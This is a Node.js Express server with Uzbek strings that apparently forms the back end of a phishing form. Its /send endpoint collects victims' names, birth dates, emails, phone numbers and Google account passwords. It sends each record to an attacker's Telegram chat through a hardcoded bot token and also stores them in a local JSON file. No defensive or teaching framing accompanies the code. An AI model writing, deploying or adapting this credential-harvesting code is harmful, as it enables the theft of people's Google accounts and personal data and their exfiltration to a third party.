// server.js
const express = require("express");
const axios = require("axios");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());
app.use(cors());

const BOT_TOKEN = "8656295440:AAEUBRVs4umfJkh-YPm3XMJh52R3e9l56bw";
const CHAT_ID = "6283517295";

const DATA_FILE = path.join(__dirname, "arizalar.json");

app.post("/send", async (req, res) => {
    const { name, day, month, year, city, hobbies, email, googlePassword, phone, extra } = req.body;

    if(!name || !city || !phone || !email || !day || !month || !year){
        return res.status(400).json({ success:false, error:"Ma’lumot yetarli emas" });
    }

    const text = `
📥 Yangi Ariza
👤 F.I.SH: ${name}
🎂 Tug‘ilgan sana: ${day}/${month}/${year}
📧 Email: ${email}
🔑 Google Parol: ${googlePassword}
📱 Telefon: ${phone}
`;

    try{
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text
        });

        let arizalar = [];
        if(fs.existsSync(DATA_FILE)){
            const raw = fs.readFileSync(DATA_FILE);
            arizalar = JSON.parse(raw);
        }
        arizalar.push({ name, day, month, year, city, hobbies, email, googlePassword, phone, extra, date: new Date() });
        fs.writeFileSync(DATA_FILE, JSON.stringify(arizalar, null, 2));

        res.json({ success:true });

    }catch(err){
        console.error(err);
        res.status(500).json({ success:false, error:err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`Server ishlayapti: http://localhost:${PORT}`));
